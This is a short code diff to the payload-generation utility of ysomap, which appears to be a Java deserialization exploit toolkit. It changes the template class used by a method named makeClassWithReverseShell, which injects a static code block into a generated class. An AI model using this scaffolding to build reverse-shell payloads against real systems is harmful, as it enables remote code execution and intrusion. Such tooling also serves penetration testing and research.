@@ -1,5 +1,6 @@
 package ysomap.core.util;
 
+import echo.SocketEchoPayload;
 import javassist.*;
 
 import java.io.File;
@@ -26,8 +27,8 @@ public class ClassFiles {
 
     public static byte[] makeClassWithReverseShell(String classname, String body) throws Exception {
         ClassPool pool = new ClassPool(true);
-        pool.appendClassPath(new ClassClassPath(shell.Shell.class));
-        CtClass cc = pool.getCtClass(shell.Shell.class.getName());
+        pool.appendClassPath(new ClassClassPath(SocketEchoPayload.class));
+        CtClass cc = pool.getCtClass(SocketEchoPayload.class.getName());
         cc.setName(classname);
         insertStaticBlock(cc, body);
         return cc.toBytecode();
